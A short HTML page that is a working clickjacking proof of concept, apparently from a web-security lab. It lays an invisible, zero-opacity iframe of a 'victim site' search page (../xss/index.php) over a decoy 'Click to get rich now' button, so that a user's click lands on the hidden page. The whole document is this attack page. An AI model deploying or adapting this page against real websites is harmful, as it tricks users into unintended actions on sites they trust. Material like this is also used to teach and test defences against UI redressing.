<!doctype html>
<html>

<head>
  <meta charset="UTF-8">
</head>

<body>

  <style>
    iframe {
      width: 1000px;
      height: 400px;
      position: absolute;
      top: 5px;
      left: -14px;
      opacity: 0;
      z-index: 1;
    }
    .abc{
      margin-top: 290px;
      margin-left: 450px;
    }
  </style>

  <h5 class="abc">Click to get rich now:</h5>

  <!-- The url from the victim site -->
  <iframe src="../xss/index.php?search=Cool"></iframe>

  <button style="margin-left: 400px; width: 200px;">Click here!</button>

  <div>...And you're cool (I'm a cool hacker actually)!</div>

</body>
</html>